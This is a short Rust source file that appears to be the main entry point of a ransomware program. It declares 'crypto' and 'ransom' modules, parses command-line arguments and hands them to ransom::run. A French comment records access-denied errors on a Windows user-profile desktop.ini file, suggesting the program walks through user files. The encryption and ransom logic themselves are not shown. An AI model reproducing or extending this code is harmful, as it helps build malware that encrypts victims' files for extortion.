use std::env;

use args::Args;
use clap::Parser;

mod args;
mod crypto;
mod ransom;

/*
Problèmes courants:
- C:\Users\Default\AppData\Local\Microsoft\Windows\WinX\Group1\desktop.ini (Accès refusé)
*/

#[tokio::main]
async fn main() -> Result<(), anyhow::Error> {
    env::set_var(
        "RUST_LOG",
        env::var("RUST_LOG").unwrap_or_else(|_| "info".to_string()),
    );
    env_logger::init();

    let args = Args::parse();

    ransom::run(args).await?;

    Ok(())
}
